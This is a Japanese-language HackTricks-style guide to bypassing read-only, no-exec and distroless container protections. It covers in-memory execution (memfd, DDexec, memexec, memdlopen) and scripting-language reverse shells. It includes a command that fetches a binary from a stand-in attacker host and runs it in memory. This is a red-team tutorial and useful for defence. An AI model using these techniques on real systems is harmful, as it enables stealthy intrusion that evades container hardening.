# FS保護のバイパス: 読み取り専用 / 実行不可 / Distroless

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTコレクション**](https://opensea.io/collection/the-peass-family)
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **ハッキングのコツを共有するために、** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出する。

</details>

## 動画

以下の動画では、このページで言及されているテクニックについてより詳しく説明しています:

* [**DEF CON 31 - Linuxメモリ操作の探索 ステルスと回避のために**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**DDexec-ng & メモリ内dlopen()を使用したステルス侵入 - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## 読み取り専用 / 実行不可シナリオ

特にコンテナ内では、**読み取り専用(ro)ファイルシステム保護**が設定されたLinuxマシンを見つけることが増えています。これは、コンテナにroファイルシステムを設定するのが、`securitycontext`で**`readOnlyRootFilesystem: true`**を設定するだけで簡単だからです:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

しかし、ファイルシステムがroとしてマウントされていても、**`/dev/shm`**は書き込み可能なので、ディスクに何も書き込めないわけではありません。ただし、このフォルダは**実行不可の保護でマウントされる**ため、ここにバイナリをダウンロードしても**実行することはできません**。

{% hint style="warning" %}
レッドチームの観点からすると、システムに既に存在しないバイナリ（バックドアや`kubectl`のような列挙ツールなど）を**ダウンロードして実行することが複雑になります**。
{% endhint %}

## 最も簡単なバイパス: スクリプト

バイナリについて言及したことに注意してください。マシン内にインタープリタがある限り、`sh`が存在する場合は**シェルスクリプト**、`python`がインストールされている場合は**pythonスクリプト**など、**任意のスクリプトを実行**できます。

しかし、これだけではバイナリバックドアや実行する必要がある他のバイナリツールを実行するには不十分です。

## メモリバイパス

ファイルシステムがバイナリの実行を許可していない場合、最良の方法は**メモリから実行すること**です。なぜなら、**保護はメモリ内では適用されない**からです。

### FD + execシステムコールバイパス

マシン内に強力なスクリプトエンジンがある場合、例えば**Python**、**Perl**、**Ruby**など、メモリから実行するバイナリをダウンロードし、それをメモリファイルディスクリプタ(`create_memfd`システムコール)に保存することができます。これは保護の対象外であり、その後**`exec`システムコール**を呼び出して**実行するファイルとしてfdを指定**します。

これには、プロジェクト[**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec)を簡単に使用できます。バイナリを渡すと、指定された言語のスクリプトを生成し、**バイナリを圧縮してb64エンコード**し、`create_memfd`システムコールを呼び出して作成された**fd**に**デコードして解凍する**指示と、それを実行するための**exec**システムコールの呼び出しを行います。

{% hint style="warning" %}
これは、PHPやNodeのような他のスクリプト言語では機能しません。なぜなら、これらの言語にはスクリプトから生のシステムコールを呼び出す**デフォルトの方法がない**ため、バイナリを保存するための**メモリfd**を作成する`create_memfd`を呼び出すことができません。

さらに、`/dev/shm`にファイルを持つ**通常のfd**を作成しても、**実行不可の保護**が適用されるため、実行することはできません。
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec)は、自分のプロセスのメモリを**`/proc/self/mem`**を上書きすることで**変更する**技術です。

したがって、プロセスによって実行されているアセンブリコードを**制御する**ことで、**シェルコード**を書き込み、プロセスを"変異"させて**任意のコードを実行**することができます。

{% hint style="success" %}
**DDexec / EverythingExec**は、独自の**シェルコード**や**任意のバイナリ**を**メモリからロードして実行する**ことを可能にします。
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
このテクニックについての詳細はGithubをチェックするか、以下を参照してください：

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec)はDDexecの自然な次のステップです。これは**デーモン化されたDDexecシェルコード**で、異なるバイナリを**実行したいたびに**DDexecを再起動する必要はなく、DDexecテクニックを介してmemexecシェルコードを実行し、このデーモンと**通信して新しいバイナリをロードして実行する**ことができます。

PHPリバースシェルからバイナリを実行するために**memexecを使用する例**は[https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php)で見ることができます。

### Memdlopen

DDexecと同様の目的で、[**memdlopen**](https://github.com/arget13/memdlopen)テクニックは、後で実行するためにメモリ内にバイナリを**より簡単にロードする方法**を提供します。これにより、依存関係を持つバイナリをロードすることも可能になるかもしれません。

## Distroless Bypass

### Distrolessとは

Distrolessコンテナには、特定のアプリケーションやサービスを実行するために必要な**最小限のコンポーネントのみ**が含まれており、ライブラリやランタイム依存関係などが含まれますが、パッケージマネージャー、シェル、システムユーティリティなどの大きなコンポーネントは除外されています。

Distrolessコンテナの目的は、不要なコンポーネントを排除し、悪用される可能性のある脆弱性の数を最小限に抑えることによって、コンテナの**攻撃面を減らすこと**です。

### リバースシェル

Distrolessコンテナでは、通常のシェルを取得するための`sh`や`bash`が**見つからない**かもしれません。また、`ls`、`whoami`、`id`などのバイナリも見つからないでしょう。通常、システムで実行するものは何もありません。

{% hint style="warning" %}
したがって、通常のように**リバースシェルを取得したり**、システムを**列挙することはできません**。
{% endhint %}

しかし、侵害されたコンテナが例えばflask webを実行している場合、pythonがインストールされているため、**Pythonリバースシェル**を取得することができます。nodeを実行している場合は、Nodeリバースシェルを取得でき、ほとんどの**スクリプト言語**でも同様です。

{% hint style="success" %}
スクリプト言語を使用して、言語の機能を使って**システムを列挙する**ことができます。
{% endhint %}

**読み取り専用/実行不可**の保護がない場合は、リバースシェルを悪用してファイルシステムにバイナリを**書き込み**、それらを**実行**することができます。

{% hint style="success" %}
しかし、この種のコンテナでは通常これらの保護が存在しますが、**前述のメモリ実行テクニックを使用してそれらをバイパスする**ことができます。
{% endhint %}

スクリプト言語の**リバースシェル**を取得し、メモリからバイナリを実行するために、いくつかのRCE脆弱性を**悪用する例**は[**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE)で見つけることができます。

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェックしてください！</strong></summary>

HackTricksをサポートする他の方法：

* HackTricksに**広告を掲載したい**場合や**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックしてください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか**、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローしてください**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有してください**。

</details>
